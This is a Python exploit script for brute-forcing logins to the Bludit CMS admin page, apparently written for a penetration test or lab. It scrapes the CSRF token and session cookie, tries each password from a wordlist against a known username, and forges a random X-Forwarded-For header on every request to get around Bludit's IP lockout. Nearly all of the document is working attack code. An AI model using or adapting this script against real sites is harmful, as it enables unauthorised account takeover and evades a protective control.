#!/usr/bin/python3
# Usage: python3 <URL> <USERNAME>
# This exploit attempts a brute-force attack on a target host. Must know USERNAME.

import requests
from bs4 import BeautifulSoup
import sys
import random

def show_help():
    print("Usage:")
    print("python3 <URL> <USERNAME> <WORDLIST>")
    exit()

if len(sys.argv) != 4:
    show_help()

URL = sys.argv[1]
USERNAME = sys.argv[2]
WORDLIST = sys.argv[3]
PROXY = {'http':'http://127.0.0.1:8080'}

def init_session():
    r = requests.get(f'{URL}')
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find(id='jstokenCSRF')
    csrf = csrf['value']
    cookie = r.cookies.get("BLUDIT-KEY")
    return csrf, cookie

def make_login_request(user, password):
    csrf, cookie = init_session();
    login_cookie = {'BLUDIT-KEY' : cookie}
    header = {'X-FORWARDED-FOR': f'{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}'}
    data = {
        "tokenCSRF" : csrf,
        "username" : user,
        "password" : password,
        "save" : ''
    }
    r = requests.post(f'{URL}', data=data, headers=header, cookies=login_cookie, allow_redirects=False)
    if r.status_code != 200:
        print(f'1.) {user}:{password} STATUS-CODE: {r.status_code}')
    elif 'password incorrect' in r.text:
        print(f'2.) {user}:{password} PASSWORD-INCORRECT STATUS-CODE: {r.status_code}')
        return False
    elif "has been blocked" in r.text:
        print("IP HAS BEEN BLOCKED")
        return False
    else:
        print(f'3.) {user}:{password} STATUS-CODE: {r.status_code}')
        return True

wl = open(WORDLIST).readlines()
for line in wl:
    line = line.strip()
    make_login_request(USERNAME, line)
